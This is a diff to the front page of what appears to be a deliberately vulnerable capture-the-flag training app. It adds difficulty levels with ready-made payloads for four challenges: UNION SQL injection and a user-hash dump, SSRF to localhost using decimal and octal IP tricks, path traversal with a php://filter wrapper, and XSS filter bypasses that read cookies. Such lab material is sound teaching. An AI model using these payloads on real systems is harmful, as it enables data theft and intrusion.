@@ -18,6 +18,7 @@ input[type=text],textarea{flex:1;min-width:220px;padding:8px 10px;border:1px sol
 textarea{min-height:92px;width:100%}
 button{background:var(--brand);color:#fff;border:0;border-radius:7px;padding:8px 13px;cursor:pointer;font-size:.88em}
 button.ghost{background:#eef2f9;color:var(--brand2)}button:hover{filter:brightness(1.06)}
+.levels{display:flex;gap:6px;margin:8px 0;flex-wrap:wrap}.lvlbtn{background:#eef2f9;color:var(--muted);font-size:.8em;padding:4px 11px}.lvlbtn.on{background:#7a3df0;color:#fff}.note{color:var(--muted);font-size:.85em}
 .res{width:100%;height:180px;border:1px solid var(--line);border-radius:8px;background:#fff;margin-top:8px;display:none}
 .rx{white-space:pre-wrap;background:#0f1622;color:#dfe6ee;border-radius:8px;padding:10px;margin-top:8px;font-family:ui-monospace,Consolas,monospace;font-size:.85em;display:none;max-height:220px;overflow:auto}
 .muted{color:var(--muted);font-size:.92em}.ok{border-color:var(--ok);background:#eafaf0}
@@ -38,11 +39,13 @@ Full walkthroughs are in <code>SOLUTIONS.md</code>.</p></div>
 <div class="card"><h2>1 · <code>search.php?q=</code> <span class="flag-pill">🏁 UNION SQLi</span></h2>
   <p class="muted">Product search. The query has 3 columns. Enumerate <code>information_schema</code> → dump
      the <code>secrets</code> table (flag) and the <code>users</code> table (crackable MD5 hashes).</p>
-  <details><summary>💡 hint</summary><code class="pl" id="pl_q">zzz%' UNION SELECT k,v,3 FROM secrets-- -</code>
+  <div class="levels" id="lv_q"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('q','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('q','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('q','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('q','expert')">Expert</button></div>
+  <details open><summary>💡 hint — <span class="note" id="note_q"></span></summary><code class="pl" id="pl_q"></code>
     <button type="button" class="ghost" onclick="fill('in_q','pl_q')">use this ▶</button>
     <code class="pl" id="pl_q2">zzz%' UNION SELECT GROUP_CONCAT(username,0x3a,password,0x3a,role SEPARATOR 0x0a),2,3 FROM users-- -</code>
-    <button type="button" class="ghost" onclick="fill('in_q','pl_q2')">use this (dump users) ▶</button></details>
+    <button type="button" class="ghost" onclick="fill('in_q','pl_q2')">dump users (easy) ▶</button></details>
   <form method="get" action="search.php" target="r_q" onsubmit="show('r_q')">
+    <input type="hidden" name="level" id="lvl_q" value="easy">
     <input type="text" id="in_q" name="q" placeholder="type your SQLi payload…"><button>Run ▶</button></form>
   <iframe name="r_q" id="r_q" class="res"></iframe></div>
 
@@ -62,10 +65,11 @@ Full walkthroughs are in <code>SOLUTIONS.md</code>.</p></div>
 <!-- 3. SSRF -->
 <div class="card"><h2>3 · <code>fetch.php?url=</code> <span class="flag-pill">🏁 SSRF</span></h2>
   <p class="muted">Server-side URL fetcher — no allow-list. Reach an internal service or a local file.</p>
-  <details><summary>💡 hint</summary><code class="pl" id="pl_url">http://127.0.0.1:8001/metadata.php</code>
-    <button type="button" class="ghost" onclick="fill('in_url','pl_url')">use this ▶</button>
-    <span class="muted"> · also try <code>file:///etc/passwd</code></span></details>
+  <div class="levels" id="lv_url"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('url','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('url','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('url','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('url','expert')">Expert</button></div>
+  <details open><summary>💡 hint — <span class="note" id="note_url"></span></summary><code class="pl" id="pl_url"></code>
+    <button type="button" class="ghost" onclick="fill('in_url','pl_url')">use this ▶</button></details>
   <form method="get" action="fetch.php" target="r_url" onsubmit="show('r_url')">
+    <input type="hidden" name="level" id="lvl_url" value="easy">
     <input type="text" id="in_url" name="url" placeholder="a URL the server will fetch…"><button>Run ▶</button></form>
   <iframe name="r_url" id="r_url" class="res"></iframe></div>
 
@@ -83,19 +87,22 @@ Full walkthroughs are in <code>SOLUTIONS.md</code>.</p></div>
 <!-- 5. Path traversal -->
 <div class="card"><h2>5 · <code>download.php?file=</code> <span class="flag-pill">🏁 path traversal</span></h2>
   <p class="muted">Downloads a file from <code>docs/</code>. Escape it with <code>../</code>.</p>
-  <details><summary>💡 hint</summary><code class="pl" id="pl_file">../private2/secret_config.txt</code>
+  <div class="levels" id="lv_file"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('file','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('file','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('file','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('file','expert')">Expert</button></div>
+  <details open><summary>💡 hint — <span class="note" id="note_file"></span></summary><code class="pl" id="pl_file"></code>
     <button type="button" class="ghost" onclick="fill('in_file','pl_file')">use this ▶</button></details>
   <form method="get" action="download.php" target="r_file" onsubmit="show('r_file')">
+    <input type="hidden" name="level" id="lvl_file" value="easy">
     <input type="text" id="in_file" name="file" placeholder="a file path…"><button>Run ▶</button></form>
   <iframe name="r_file" id="r_file" class="res"></iframe></div>
 
 <!-- 6. Filtered XSS -->
 <div class="card"><h2>6 · <code>greet.php?name=</code> <span class="flag-pill">🏁 filtered XSS</span></h2>
   <p class="muted">Greeting with a naive filter that strips <code>&lt;script&gt;</code> once. Bypass it; the page sets a non-HttpOnly <code>flag</code> cookie.</p>
-  <details><summary>💡 hint</summary><code class="pl" id="pl_name">&lt;img src=x onerror=alert(document.cookie)&gt;</code>
-    <button type="button" class="ghost" onclick="fill('in_name','pl_name')">use this ▶</button>
-    <span class="muted"> · or nested <code>&lt;scr&lt;script&gt;ipt&gt;</code></span></details>
+  <div class="levels" id="lv_name"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('name','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('name','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('name','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('name','expert')">Expert</button></div>
+  <details open><summary>💡 hint — <span class="note" id="note_name"></span></summary><code class="pl" id="pl_name"></code>
+    <button type="button" class="ghost" onclick="fill('in_name','pl_name')">use this ▶</button></details>
   <form method="get" action="greet.php" target="r_name" onsubmit="show('r_name')">
+    <input type="hidden" name="level" id="lvl_name" value="easy">
     <input type="text" id="in_name" name="name" placeholder="your XSS payload…"><button>Run ▶</button></form>
   <iframe name="r_name" id="r_name" class="res"></iframe></div>
 
@@ -116,6 +123,20 @@ Full walkthroughs are in <code>SOLUTIONS.md</code>.</p></div>
 <script>
 function fill(inputId, plId){ document.getElementById(inputId).value = document.getElementById(plId).textContent; }
 function show(frameId){ document.getElementById(frameId).style.display='block'; }
+const PAYLOADS={
+ q:{easy:{p:"zzz%' UNION SELECT k,v,3 FROM secrets-- -",n:"Easy — raw UNION."},medium:{p:"zzz%' UNIunionON SELselectECT k,v,3 FROM secrets-- -",n:"Medium — union/select stripped once → nest (UNIunionON)."},hard:{p:"zzz%'/**/UNIunionON/**/SELselectECT/**/k,v,3/**/FROM/**/secrets#",n:"Hard — + spaces stripped → /**/ and end with #."},expert:{p:"zzz' OR 1=1-- -",n:"Expert — BLIND (match/no match). Boolean-extract the flag char by char."}},
+ url:{easy:{p:"http://127.0.0.1:8001/metadata.php",n:"Easy — no filter."},medium:{p:"http://127.1:8001/metadata.php",n:"Medium — 127.0.0.1/localhost blocked → 127.1 (or decimal/octal)."},hard:{p:"http://2130706433:8001/metadata.php",n:"Hard — 127. and 0.0.0.0 blocked → decimal IP 2130706433 (or hex/octal)."},expert:{p:"http://0177.0.0.1:8001/metadata.php",n:"Expert — decimal/hex/file:// blocked → octal 0177.0.0.1."}},
+ file:{easy:{p:"../private2/secret_config.txt",n:"Easy — raw ../."},medium:{p:"....//private2/secret_config.txt",n:"Medium — ../ stripped once → ....// (one is enough; docs/ is one level deep)."},hard:{p:"....//private2/secret_config.txt",n:"Hard — + must end .txt/.conf/.md (it does)."},expert:{p:"php://filter/convert.base64-encode/resource=private2/secret_config.txt",n:"Expert — traversal blocked → php://filter wrapper, then base64-decode."}},
+ name:{easy:{p:"<script>alert(document.cookie)</script>",n:"Easy — raw."},medium:{p:"<img src=x onerror=alert(document.cookie)>",n:"Medium — <script stripped → <img onerror>."},hard:{p:"<details open ontoggle=alert(document.cookie)>",n:"Hard — onerror/onload stripped → ontoggle."},expert:{p:"<input autofocus onfocus=alert(document.cookie)>",n:"Expert — ontoggle stripped → autofocus+onfocus."}}
+};
+function setLvl(card,lvl){
+  var Ld=document.getElementById('lvl_'+card); if(Ld) Ld.value=lvl;
+  var d=PAYLOADS[card][lvl];
+  var pl=document.getElementById('pl_'+card); if(pl) pl.textContent=d.p;
+  var nt=document.getElementById('note_'+card); if(nt) nt.textContent=d.n;
+  document.querySelectorAll('#lv_'+card+' .lvlbtn').forEach(function(b){ b.classList.toggle('on', b.getAttribute('data-l')===lvl); });
+}
+['q','url','file','name'].forEach(function(c){ setLvl(c,'easy'); });
 function sendXml(){
   var out=document.getElementById('r_xml'); out.style.display='block'; out.textContent='sending…';
   fetch('import.php',{method:'POST',headers:{'Content-Type':'application/xml'},body:document.getElementById('in_xml').value})
